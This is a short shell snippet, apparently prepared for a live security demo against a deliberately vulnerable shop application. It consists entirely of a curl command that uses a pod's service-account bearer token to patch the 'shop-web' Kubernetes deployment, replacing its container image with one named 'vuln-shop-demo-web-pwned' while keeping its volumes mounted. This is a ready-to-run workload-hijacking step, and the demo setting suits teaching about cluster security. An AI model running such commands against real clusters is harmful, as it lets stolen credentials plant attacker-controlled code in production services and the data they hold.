# copy this so we don't need to type the whole curl command live
curl -k -H "Authorization: Bearer $TOKEN" \
  https://$KUBERNETES_SERVICE_HOST/apis/apps/v1/namespaces/default/deployments/shop-web \
  -X PATCH \
  -H 'Content-Type: application/merge-patch+json' \
  -d '{
  "spec": {
    "template": {
      "spec": {
        "containers": [
          {
            "name": "shop-web",
            "image": "danisantos/vuln-shop-demo-web-pwned:latest",
            "imagePullPolicy": "Always",
            "volumeMounts": [{
                "mountPath": "/app/uploads",
                "name": "uploads"
              }, {
                "mountPath": "/app/views/images/rendered",
                "name": "rendered"
              }
            ]
          }
        ]
      }
    }
  }
}'